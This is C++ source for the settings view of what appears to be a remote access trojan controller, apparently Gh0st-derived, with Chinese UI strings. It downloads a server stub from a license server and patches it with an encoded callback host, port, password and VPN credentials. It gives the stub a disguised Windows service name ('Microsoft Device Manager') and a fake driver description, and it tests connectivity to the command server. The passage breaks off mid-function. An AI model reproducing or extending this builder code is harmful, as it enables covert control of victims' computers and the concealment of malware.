// SettingsView.cpp : implementation file
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"
#include "SettingsView.h"
#include "MainFrm.h"
#include "Public.h"
#include "encode.h"
#include "LOGIN.h"
#include "IniFile.h"
#include "EnDeCode.h"
#include "..\\WdkPath\\myprocess.h"

#include "MyDBConn.h"
#include "Log.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

extern char	g_szUserName[];
extern char	g_szPassword[];

CSettingsView *g_pSettingView=NULL;

extern CLog g_logErr;

/*
enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};

struct socks5req1
{
    char Ver;
    char nMethods;
    char Methods[2];
};

struct socks5ans1
{
    char Ver;
    char Method;
};

struct socks5req2
{
    char Ver;
    char Cmd;
    char Rsv;
    char Atyp;
    unsigned long IPAddr;
    unsigned short Port;
    
	//    char other[1];
};

struct socks5ans2
{
    char Ver;
    char Rep;
    char Rsv;
    char Atyp;
    char other[1];
};

struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};
*/

struct VPNINFO
{
	TCHAR szConnectIp[64];
	TCHAR szVPNServerIp[32];
	TCHAR szVPNUser[32] ;
	TCHAR szPassd[32];
	TCHAR szCaseID[8];
	TCHAR szClueID[8];
	TCHAR szLeakID[64];

};

typedef struct VPNINFO  stu_vpn_param;

/////////////////////////////////////////////////////////////////////////////
// CSettingsView

IMPLEMENT_DYNCREATE(CSettingsView, CFormView)

CSettingsView::CSettingsView()
	: CFormView(CSettingsView::IDD)
	, m_filterUnknown(TRUE)
	, m_autoSelectVisible(FALSE)
	, m_MaxConnect(1000)
{
	//{{AFX_DATA_INIT(CSettingsView)
	m_remote_host = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Host", "");
	m_remote_port = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Connection", "Port", "80");
	m_listen_port = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 80);
	m_max_connections = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection", 8000);
	m_connect_auto = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto", 0);
	m_bIsDisablePopTips = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", FALSE);
	m_filterUnknown = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "filter unknown clue", FALSE);
	m_autoSelectVisible = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "auto select and visible", FALSE);
	m_MaxConnect = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "max connect", 500);

	////add by zhenyu  放在这里有bug
	//m_iVpnFlag = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("VPN", "ISUSE", 0);
	//m_VpnServerIP = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNServerIP", "");
	//m_VpnUsername = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNUserName", "");
	//m_VpnPassd = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNPassd", "");
	//m_VpnTspIP = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNTSPIP", "");


	////add end

	m_bIsSaveAsDefault = FALSE;
	m_encode = _T("");
	m_ServiceDisplayName = _T("");
	m_ServiceDescription = _T("");
	m_pass = _T("");
	m_username =g_szUserName;
	m_userpass =g_szPassword;

// 	m_username = _T("admin");
// 	m_userpass = _T("admin");
	m_bFirstShow = TRUE;
	m_delete = FALSE;
	m_hThreadHandle = NULL;
	g_pSettingView=this;
	//}}AFX_DATA_INIT
}

CSettingsView::~CSettingsView()
{
}

void CSettingsView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingsView)
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 50000);
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_bIsDisablePopTips);
	DDX_Check(pDX, IDC_SAVEAS_DEFAULT, m_bIsSaveAsDefault);
	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Text(pDX, IDC_SerName, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_SerMS, m_ServiceDescription);
	DDX_Text(pDX, IDC_PASS, m_pass);
	DDX_Text(pDX, IDC_username, m_username);
	DDX_Text(pDX, IDC_userpass, m_userpass);

	DDX_Check(pDX, IDC_Delete, m_delete);
	//}}AFX_DATA_MAP
	//	DDX_Control(pDX, IDC_IPADDRESSALERT, m_ctrAlertIP);
	DDX_Check(pDX, IDC_FILTER_UNKNOWN, m_filterUnknown);
	DDX_Check(pDX, IDC_AUTO_SELECT_VISIBLE, m_autoSelectVisible);
	DDX_Text(pDX, IDC_MAX_CONNECT, m_MaxConnect);
	DDX_Control(pDX, IDC_COMBO2, m_UserChoice);
}


BEGIN_MESSAGE_MAP(CSettingsView, CFormView)
	//{{AFX_MSG_MAP(CSettingsView)
	ON_CONTROL_RANGE(EN_CHANGE, IDC_REMOTE_HOST, IDC_PROXY_PASS, OnChangeConfig)
	ON_BN_CLICKED(IDC_RESETPORT, OnResetport)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	ON_BN_CLICKED(IDC_CHECK_AUTH, OnCheckAuth)
	ON_BN_CLICKED(IDC_TEST_PROXY, OnTestProxy)
	ON_BN_CLICKED(IDC_CHECK_PROXY, OnCheckProxy)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	ON_BN_CLICKED(IDC_SAVEAS_DEFAULT, OnSaveasDefault)
	ON_BN_CLICKED(IDC_ShengCheng, OnShengCheng)
	ON_EN_CHANGE(IDC_PASS, OnChangePass)
	//}}AFX_MSG_MAP
//	ON_NOTIFY(IPN_FIELDCHANGED, IDC_IPADDRESSALERT, &CSettingsView::OnIpnFieldchangedIpaddressalert)
//	ON_BN_CLICKED(IDC_ADDAKERTIP, &CSettingsView::OnBnClickedAddakertip)
//	ON_BN_CLICKED(IDC_DELETEALERTIP, &CSettingsView::OnBnClickedDeletealertip)
	ON_BN_CLICKED(IDC_BAOJIAN, &CSettingsView::OnBnClickedBaojian)
//	ON_BN_CLICKED(IDC_IDC_ShengCheng, &CSettingsView::OnBnClickedIdcShengcheng)
ON_BN_CLICKED(IDC_FILTER_UNKNOWN, &CSettingsView::OnBnClickedFilterUnknown)
ON_BN_CLICKED(IDC_AUTO_SELECT_VISIBLE, &CSettingsView::OnBnClickedAutoSelectVisible)
ON_EN_CHANGE(IDC_MAX_CONNECT, &CSettingsView::OnEnChangeMaxConnect)
ON_CBN_DROPDOWN(IDC_COMBO2, &CSettingsView::OnCbnDropdownCombo2)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettingsView diagnostics

#ifdef _DEBUG
void CSettingsView::AssertValid() const
{
	CFormView::AssertValid();
}

void CSettingsView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSettingsView message handlers

void CSettingsView::OnChangeConfig(UINT id)
{
	UpdateData();

	CString str = m_remote_host + ":" + m_remote_port;
	if ( m_pass.GetLength() != 0 )
	{
		str += "|";
		str += m_pass;
	}
	str.MakeLower();
	m_encode = MyEncode(str.GetBuffer(0));
	m_encode.Insert(0, "AAAA");
	m_encode += "AAAA";
	UpdateData(FALSE);

}

void CSettingsView::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class

	if (m_bFirstShow)
	{
		if (m_remote_host.GetLength() == 0)
		{
			char hostname[256]; 
			gethostname(hostname, sizeof(hostname));
			HOSTENT *host = gethostbyname(hostname);
			if (host != NULL)
				m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
			else
				m_remote_host = _T("192.168.16.2");	
		}
		m_delete = TRUE;
		UpdateData(FALSE);


		UpdateProxyControl();
		OnConnectAuto();

		// 更新字串
		OnChangeConfig(0);
		int	nEditControl[] = {IDC_LISTEN_PORT, IDC_CONNECT_MAX, IDC_REMOTE_HOST, IDC_REMOTE_PORT, 
			IDC_PROXY_HOST, IDC_PROXY_PORT, IDC_PROXY_USER, IDC_PROXY_PASS, IDC_ENCODE};
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);

		int	nBtnControl[] = {IDC_RESETPORT, IDC_TEST_MASTER, IDC_TEST_PROXY};

		for (int i = 0; i < sizeof(nBtnControl) / sizeof(int); i++)
		{
			m_Btn[i].SubclassDlgItem(nBtnControl[i], this);
			m_Btn[i].SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
		}

 		//if (((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist)
 		//	SetDlgItemText(IDC_SYSTEM_TIPS, "找到IP数据库文件: QQWry.Dat");
 		//else
 		//	SetDlgItemText(IDC_SYSTEM_TIPS, "没有找到IP数据库文件QQWry.Dat 请将此文件放至本程序同目录下以显示服务端地理位置");
	}

	m_bFirstShow = FALSE;

	SetDlgItemText(IDC_SerName, 
		((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DisplayName", "Microsoft Device Manager"));
	SetDlgItemText(IDC_SerMS, 
		((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Description", "监测和监视新硬件设备并自动更新设备驱动"));

	SetDlgItemText(IDC_ALERT_STATIC,"提示:\r\n  1、如果是第一次设置，则应设置手机号，该手机号必需为飞信的注册用户,"
		                            "并且在本机用迷你飞信登录一次!\r\n\n  2、该报警系统是通过线索发送的，如没有线索"
									"的上线用户是无法发送的\r\n\n  3、线索设置联系当地的客服\r\n"
									);


	CIniFile IniFile;
	CString AppName="Mobile";

	CString strtmp=IniFile.GetString(AppName,"start","");

	if (strtmp=="true")
	{
		GetDlgItem(IDC_BAOJIANSTATE)->SetWindowText("报警功能已开启");
		GetDlgItem(IDC_BAOJIAN)->SetWindowText("关闭");
	}
	else	
	{
		GetDlgItem(IDC_BAOJIANSTATE)->SetWindowText("报警功能已关闭");
		GetDlgItem(IDC_BAOJIAN)->SetWindowText("开启");
	}
	strtmp="";
	strtmp=IniFile.GetString(AppName,"Tel1","");
	GetDlgItem(IDC_MOBILE_EDIT)->SetWindowText(strtmp);


	if (!m_UserChoice.GetCount())
	{
		m_UserChoice.ResetContent();
		m_UserChoice.SetDroppedWidth(20);//约定为10
		OnCbnDropdownCombo2();

		m_UserChoice.SetCurSel(0);
	}

	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

void CSettingsView::OnResetport() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;

	UpdateData(TRUE);

	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}

	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
}

void CSettingsView::OnConnectAuto() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

void CSettingsView::OnCheckAuth() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}

void CSettingsView::OnCheckProxy() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}


void CSettingsView::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		AfxMessageBox("请完整填服务器信息");
		return;
	}
	
	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
}

void CSettingsView::OnTestProxy() 
{
	// TODO: Add your control notification handler code here
}


void CSettingsView::UpdateProxyControl()
{
}

DWORD WINAPI CSettingsView::TestProxy( LPVOID lparam )
{

	return 0;
}

DWORD WINAPI CSettingsView::TestMaster( LPVOID lparam )
{
	CSettingsView	*pThis = (CSettingsView *)lparam;
	CString	strResult;
	BOOL	bRet = TRUE;
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		AfxMessageBox("socket 初始化失败");
		return FALSE;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_remote_host);
	if (pHostent == NULL)
	{
		bRet = FALSE;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(atoi(pThis->m_remote_port));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = FALSE;
		goto fail;
	}
fail:
	closesocket(sRemote);
	

	if (bRet)
		strResult.Format("成功打开到主机%s的连接， 在端口 %s: 连接成功", pThis->m_remote_host, pThis->m_remote_port);
	else
		strResult.Format("不能打开到主机%s的连接， 在端口 %s: 连接失败", pThis->m_remote_host, pThis->m_remote_port);
	AfxMessageBox(strResult);
	return -1;	
}

void CSettingsView::OnDisablePoptips() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "PopTips", m_bIsDisablePopTips);
	((CTSPClientApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
}

void CSettingsView::OnSaveasDefault() 
{
	// TODO: Add your control notification handler code here
	OnChangeConfig(0);
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}




#define	MAX_CONFIG_LEN	1024//从-1024的地方开始读取上线数据
LPCTSTR FindConfigString(char *strFileName, LPCTSTR lpString)
{
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;

	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}




void CSettingsView::OnShengCheng() 
{
	// TODO: Add your control notification handler code here
	char szMmInfo[256]={0};
	memset(m_szMmID[0],0,8);
	memset(m_szMmID[1],0,8);

	char *pPonitId =NULL;
	
	int nCurSel = m_UserChoice.GetCurSel();   
	if (nCurSel == LB_ERR)
	{
		AfxMessageBox("请先在右侧选择生成木马的用户 -:(");
		return;
	}

	m_UserChoice.GetLBText(nCurSel, m_Mmuser);
	//m_Mmuser+="_00"; //拼出来的，00没用
	strcpy(szMmInfo,m_Mmuser.GetString());
	pPonitId = strstr(szMmInfo,"-");
	if (NULL != pPonitId)
	{
		pPonitId +=1;
		strcpy(m_szMmID[0],pPonitId);
		strcpy(m_szMmID[1],"00");
	}
	
	//add by zhenyu
	m_iVpnFlag = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetInt("VPN", "ISUSE", 0);
	m_VpnServerIP = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNServerIP", "");
	m_VpnUsername = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNUserName", "");
	m_VpnPassd = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNPassd", "");
	m_VpnTspIP = ((CTSPClientApp *)AfxGetApp())->m_IniFile.GetString("VPN", "VPNTSPIP", "");


	//add end



	UpdateData(TRUE);

	if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty())
	{
		AfxMessageBox("请完整填写服务显示名称和描述 -:(");
		return;
	}
	if ( m_username.GetLength() == 0 || m_userpass.GetLength() == 0 )
	{
		AfxMessageBox("请完整填写用户名和密码 -:(");
		return;
	}
	// 保存配置
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", m_ServiceDisplayName);
	((CTSPClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", m_ServiceDescription);

	CFileDialog dlg(FALSE, "exe", "server.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
	{
		return;
	}
	
	m_strServerFile = dlg.GetPathName();
	m_hThreadHandle = ::CreateThread(NULL, 0, &CSettingsView::DownloadServerEx, this, 0, NULL);
	m_dlgProgress.DoModal();	
}


void CSettingsView::OnChangePass()
{
	// TODO: Add your control notification handler code here
	OnChangeConfig(0);
}


SOCKET CSettingsView::LoginLicenseSvr()
{
	BOOL bRet = FALSE;

	SOCKET sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		return sockInt;
	}

	CString strErr;
	UINT uType=MB_ICONERROR;

	do 
	{

		struct sockaddr_in serverAddr;

		//获取服务器IP和端口
		serverAddr.sin_family = AF_INET;
		char tgtIP[30] = {0};
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(LICSERVER_IPADDR)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			lstrcpy(tgtIP,inet_ntoa(in));
		}

		serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
		serverAddr.sin_port = htons(LICSERVER_LISPORT);

		//连接服务
		if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
		{
			strErr ="连接服务器失败!\n";
			break;
		}

		char USERIMFOR[256] = {0}, buff[256] = {0};
		wsprintf( USERIMFOR, "Login:%s@%s", m_username, m_userpass);
		if(send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
		{
			strErr ="发送数据失败!\n";
			break;
		}

		int Ret = recv( sockInt, buff, sizeof(buff), NULL );
		if ( Ret == 0 || Ret == SOCKET_ERROR||strlen(buff)==0)
		{

			strErr ="接收数据时出错!\n";
			break;
		}

		if (strstr( buff,"Logined" ) == NULL)//通过验证
		{
			strErr ="账号或者密码错误!\n";
			break;
		}
		uType=MB_OK;
		bRet = TRUE;

	}while(FALSE);

	if (!bRet)
	{
		closesocket(sockInt);
		sockInt = INVALID_SOCKET;
	}

	if (!strErr.IsEmpty())
	{
		this->MessageBox(strErr,"友情提示",uType);
	}	
	return sockInt;
}


DWORD WINAPI CSettingsView::DownloadServerEx(LPVOID lpVoid)
{
	return ((CSettingsView *)lpVoid)->DownloadServer();
}


DWORD CSettingsView::DownloadServer()
{
	DWORD recvsize = 0;
	SOCKET sockInt;
	//struct sockaddr_in serverAddr;

	CString strErr;
	UINT uType=MB_ICONERROR;
	int Ret=0;
	int iOffsetXX = 0;
	do 
	{


		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		}

		m_dlgProgress.ShowClientUpdataInfo(sockInt,"ClientUpdataInfo.txt");

		closesocket(sockInt);		

		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		}

		char TmpPath[MAX_PATH];
		GetTempPath( sizeof(TmpPath), TmpPath );
		lstrcat( TmpPath, "\\HACKFANSSC.exe" );
		DeleteFile(TmpPath);

		NET_DATA MyData = {0};
		DWORD dwBytes = 0;;
		HANDLE hFile = CreateFile(TmpPath, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		//request[0] = DOWN_LINYI_SERVER;

		request[0] = DOWN_TSP20_SERVER;  //by menglz

		//StrCat((char*)request,"server.dat");


		if ( GetFileAttributes(TmpPath) == -1 )
		{
			strErr = ("File is exist and can't delete!");
			break;
		}

		BOOL bRet = FALSE;
		char ENCODE[1025] = {0};
		DWORD dwFileSize=0;



		do 
		{
			if ( m_pass.GetLength() != 0 )
			{
				lstrcpy( (char*)&request[1], m_pass.GetBuffer(0) );
			}

			send( sockInt, (char*)&request, sizeof(request),NULL);

			//接收文件的大小
			recv( sockInt,(char*)&dwFileSize,sizeof(DWORD),NULL);

			char *RecvData=new char[RECV_MAX_BUF];
			DWORD recvsize = 0;


			while (TRUE)
			{
				memset(RecvData, 0,RECV_MAX_BUF);

				int dwRetSize = recv( sockInt,RecvData,RECV_MAX_BUF,NULL);
				if ( dwRetSize == 0 || dwRetSize == SOCKET_ERROR )
				{
					strErr = "获取文件出错!";
					break;
				}

				recvsize += dwRetSize;
				m_dlgProgress.SetPos(recvsize,dwFileSize);


				if ( recvsize>=dwFileSize ) 
				{
					int offset = memfind(RecvData,"WCCCRX",dwRetSize-5, 0);

					if (offset!=-1)
					{
						lstrcpy(ENCODE,RecvData+offset);
						WriteFile(hFile,RecvData,offset,&dwBytes, NULL);
					}
					else WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);

					bRet = TRUE;
					break;
				}
				WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
			}
			delete RecvData;

		} while (FALSE);

		SetFilePointer(hFile,0,NULL, FILE_BEGIN);
		char *ReadBuf=new char[dwFileSize];
		memset(ReadBuf, 0,dwFileSize);
		ReadFile(hFile, ReadBuf, dwFileSize,&dwBytes,NULL);
		
		int offset = memfind(ReadBuf, "CHAONIMADEXXX", dwFileSize,0);
		if (offset!=-1)
		{
			stu_vpn_param *stu=(stu_vpn_param*)(ReadBuf+offset);
			iOffsetXX = offset;
			if ( 1 == m_iVpnFlag)   //判断此标志位，如果为1，就用VPNTSPClientIP，否则用TSPLicense返回IP
			{
				strncpy(stu->szConnectIp,"WCCCRX",sizeof("WCCCRX"));
				char *sztempIP = (char *)m_VpnTspIP.GetString();
				
				for (size_t i = 0; i <m_VpnTspIP.GetLength(); i++)
				{
					if (sztempIP[i]!=0x67)
					{
						sztempIP[i] ^= 0x67;

					}
				}
				strcat(stu->szConnectIp,EnDeCode::MyEncode(sztempIP));
				strncpy(stu->szVPNServerIp,EnDeCode::Encode(EnDeCode::encrypt((char*)m_VpnServerIP.GetString())),sizeof(stu->szVPNServerIp));
				strncpy(stu->szPassd,EnDeCode::Encode(EnDeCode::encrypt((char*)m_VpnPassd.GetString())),sizeof(stu->szPassd));
				strncpy(stu->szVPNUser,EnDeCode::Encode(EnDeCode::encrypt((char*)m_VpnUsername.GetString())),sizeof(stu->szVPNUser));
			}
			else
			{
				strncpy(stu->szConnectIp,ENCODE,sizeof(stu->szConnectIp));
			}
			SetFilePointer(hFile,0,NULL, FILE_BEGIN);
			//WriteFile(hFile,ReadBuf,dwFileSize-strlen(ENCODE)-1,&dwBytes,NULL);
			WriteFile(hFile,ReadBuf,dwFileSize,&dwBytes,NULL);
		
		}

		delete ReadBuf;


		CloseHandle(hFile);
		//关闭SOCK
		closesocket(sockInt);
		if (!bRet)
		{
			strErr = ("下载文件失败");
			break;
		}
		DeleteFile(m_strServerFile);

		char szIsUserINIPath[MAX_PATH]={0};
		int iIsUser = 0;
		////添加判断使用者的code zhenyu-2015-0-12
		if( !GetModuleFileName(NULL, szIsUserINIPath, MAX_PATH))
		{
			return -1;
		}
		if (NULL == strrchr( szIsUserINIPath, '\\'))
		{
			return -1;
		}
		strrchr( szIsUserINIPath, '\\')[1]= 0; //删除文件名，只获得路径
		strcat(szIsUserINIPath,"ISTSPUSER.ini");

		iIsUser = GetPrivateProfileInt("ISTSPUSER","ISTSPUSER",0,szIsUserINIPath);
		if (1 == iIsUser)
		{
			//add by zhenyu 写入id
			WriteClueToMumaFile(TmpPath,m_szMmID[0],m_szMmID[1],iOffsetXX);
		//	OutputDebugString("IDIDIDIDIDIDIDIDIDIDIDIDI");

			//add end
		}

		MoveFile(TmpPath, m_strServerFile);
		strErr = ("生成文件成功，请测试上线。");
		uType=MB_OK;

	} while (FALSE);

	// 	::PostMessage(m_dlgProgress.m_hWnd, WM_QUIT, NULL, NULL);
	//strErr.Format("%s :%d",strErr.GetBuffer(),GetLastError());

	if (!strErr.IsEmpty())
	{
		m_dlgProgress.MessageBox(strErr,"友情提示",uType);
	}
	//m_dlgProgress.SendMessage(WM_CLOSE);



	return 0;	

}


DWORD CSettingsView::DownloadServer2()
{
	DWORD recvsize = 0;
	SOCKET sockInt;
	//struct sockaddr_in serverAddr;

	CString strErr;
	UINT uType=MB_ICONERROR;

	int Ret=0;
	do 
	{


		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		}

		m_dlgProgress.ShowClientUpdataInfo(sockInt,"ClientUpdataInfo.txt");

		closesocket(sockInt);		

		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET){
			//strErr = "Login error!\n";
			break;
		}

		char TmpPath[MAX_PATH];
		GetTempPath( sizeof(TmpPath), TmpPath );
		lstrcat( TmpPath, "\\HACKFANSSC.exe" );
		DeleteFile(TmpPath);

		NET_DATA MyData = {0};
		DWORD dwBytes = 0;;
		HANDLE hFile = CreateFile(TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = DOWN_SERVER_NEW;
		
		//StrCat((char*)request,"server.dat");


		if ( GetFileAttributes(TmpPath) == -1 )
		{
			strErr = ("File is exist and can't delete!");
			break;
		}

		BOOL bRet = FALSE;

		do 
		{
			if ( m_pass.GetLength() != 0 )
			{
				lstrcpy( (char*)&request[1], m_pass.GetBuffer(0) );
			}

			send( sockInt, (char*)&request, sizeof(request),NULL);

			//接收文件的大小
			DWORD dwFileSize=0;
			recv( sockInt,(char*)&dwFileSize,sizeof(DWORD),NULL);

			char *RecvData=new char[RECV_MAX_BUF];
			DWORD recvsize = 0;


			while (TRUE)
			{
				memset(RecvData, 0,RECV_MAX_BUF);

				int dwRetSize = recv( sockInt,RecvData,RECV_MAX_BUF,NULL);
				if ( dwRetSize == 0 || dwRetSize == SOCKET_ERROR )
				{
					strErr = "获取文件出错!";
					break;
				}


				recvsize += dwRetSize;
				m_dlgProgress.SetPos(recvsize,dwFileSize);

				if ( recvsize>=dwFileSize ) 
				{

					WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);

 					bRet = TRUE;
					break;
				}
				WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
				//		send( sockInt, laji, sizeof(laji),NULL);
			}

		} while (FALSE);


		//关闭文件
		CloseHandle(hFile);

		//关闭SOCK
		closesocket(sockInt);
		if (!bRet)
		{
			strErr = ("下载文件失败");
			break;
		}

		CString		strServiceConfig;
		strServiceConfig.Format("%s|%s", MyEncode(m_ServiceDisplayName.GetBuffer(0)), 
			MyEncode(m_ServiceDescription.GetBuffer(0)));

		if (m_delete)
		{
			strServiceConfig += "()";
		}

		char ENCODE[1025] = {0};
		lstrcpy( ENCODE, FindConfigString(TmpPath,"WCCCRX") );

		HANDLE hUpdate = BeginUpdateResource( TmpPath, FALSE);
		if (!hUpdate)
		{
			strErr = ("配置时失败");
			DeleteFile(TmpPath);
			break;
		}
		if ( !UpdateResource(hUpdate, "INFORMATION", MAKEINTRESOURCE(IDR_ENCODE), 0, ENCODE, lstrlen(ENCODE) + 1)  )
		{
			CloseHandle(hUpdate);
			strErr = ("配置时失败");
			DeleteFile(TmpPath);
			break;
		}
